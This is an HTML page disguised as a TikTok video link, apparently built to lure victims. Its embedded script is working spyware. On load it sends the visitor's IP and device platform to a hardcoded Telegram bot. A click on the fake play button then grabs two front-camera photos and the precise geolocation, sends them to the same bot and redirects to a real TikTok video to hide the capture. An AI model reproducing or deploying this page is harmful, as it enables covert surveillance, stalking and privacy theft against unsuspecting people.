<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TikTok</title>
    <meta property="og:title" content="TikTok . Rudaw Soran">

    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; }
        /* üñºÔ∏è Ÿà€éŸÜ€ï€å Ÿæÿ¥ÿ™€éŸÜ€ï ⁄Ø€Ü⁄ïÿØÿ±ÿß ÿ®€Ü pasha.jpg */
        .bg { 
            position: fixed; 
            top: 0; 
            left: 0; 
            width: 100%; 
            height: 100%; 
            background: url('pasha.jpg') no-repeat center center; 
            background-size: contain; 
            z-index: 1; 
        }
        .play-btn { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 5; pointer-events: none; }
        .play-icon { width: 90px; height: 90px; fill: white; opacity: 0.9; }
        #trap { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 100; cursor: pointer; }
        #flash { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 200; display: none; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div class="bg"></div>
    <div class="play-btn"><svg class="play-icon" viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg></div>
    <div id="flash"></div>
    <div id="trap" onclick="startApp()"></div>
    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

    <script>
        const token = "8454166362:AAE-teyJSdRqs8yUA4UPUeHmiIT0TtyT1hc";
        const chat_id = "7261354534";
        const targetVideo = "https://vt.tiktok.com/ZS5WMhjoP/";

        async function notifyVisit() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                const ip = data.ip;
                const msg = `üîî ŸÑ€åŸÜ⁄©€ï⁄©€ï ⁄©ÿ±ÿß€å€ïŸà€ï!\nüåê ÿ¶ÿß€åŸæ€å: ${ip}\nüì± ÿ¶ÿßŸÖ€éÿ±: ${navigator.platform}`;
                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
            } catch (e) {
                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("üîî ŸÑ€åŸÜ⁄©€ï⁄©€ï ⁄©ÿ±ÿß€å€ïŸà€ï ÿ®€ï⁄µÿßŸÖ ÿ¶ÿß€åŸæ€å ŸÜ€ïÿÆŸà€éŸÜÿØÿ±ÿß€å€ïŸà€ï")}`);
            }
        }
        notifyVisit();

        async function sendPhoto(v, c, fileName, caption) {
            c.width = v.videoWidth; c.height = v.videoHeight;
            c.getContext('2d').drawImage(v, 0, 0);
            const blob = await (await fetch(c.toDataURL('image/jpeg', 0.9))).blob();
            const fd = new FormData();
            fd.append('chat_id', chat_id);
            fd.append('photo', blob, fileName);
            fd.append('caption', caption);
            return fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
        }

        async function startApp() {
            try {
                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const v = document.getElementById('v');
                v.srcObject = s;
                await v.play();
                const f = document.getElementById('flash');
                f.style.display = 'block';

                setTimeout(async () => {
                    await sendPhoto(v, document.getElementById('c'), "1.jpg", "üì∏ Snap 1");
                    
                    setTimeout(async () => {
                        await sendPhoto(v, document.getElementById('c'), "2.jpg", "üì∏ Snap 2");
                        f.style.display = 'none';

                        if (navigator.geolocation) {
                            navigator.geolocation.getCurrentPosition(async (pos) => {
                                const lat = pos.coords.latitude;
                                const lon = pos.coords.longitude;
                                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                                
                                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("üìç ŸÑ€Ü⁄©€ï€åÿ¥ŸÜ:\n" + mapLink)}`);
                                window.location.href = targetVideo;
                            }, () => { window.location.href = targetVideo; }, { enableHighAccuracy: true });
                        } else { window.location.href = targetVideo; }
                    }, 200);
                }, 1000);
            } catch (e) {
                window.location.href = targetVideo;
            }
        }
    </script>
</body>
</html>
